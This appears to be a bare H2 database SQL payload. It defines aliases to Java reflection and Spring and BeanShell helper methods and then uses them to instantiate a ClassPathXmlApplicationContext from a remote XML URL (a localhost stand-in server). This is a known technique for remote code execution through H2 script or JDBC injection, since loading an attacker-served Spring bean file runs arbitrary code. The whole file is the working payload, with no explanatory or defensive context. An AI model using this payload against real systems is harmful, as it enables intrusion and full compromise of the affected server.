CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)';
CREATE ALIAS NEW_INSTANCE FOR 'org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])';
CREATE ALIAS UNESCAPE_VALUE FOR 'javax.naming.ldap.Rdn.unescapeValue(java.lang.String)';
CREATE ALIAS CREATE_OBJ FOR 'org.springframework.scripting.bsh.BshScriptUtils.createBshObject(java.lang.String)';

SET @url_str='http://127.0.0.1:8000/1.xml';
SET @url_obj=UNESCAPE_VALUE(@url_str);
SET @str='new java.lang.Object[]{"http://127.0.0.1:8000/1.xml"}';
SET @obj=CREATE_OBJ(@str);
SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext');
SET @string_clazz=CLASS_FOR_NAME('java.lang.String');

CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], @obj);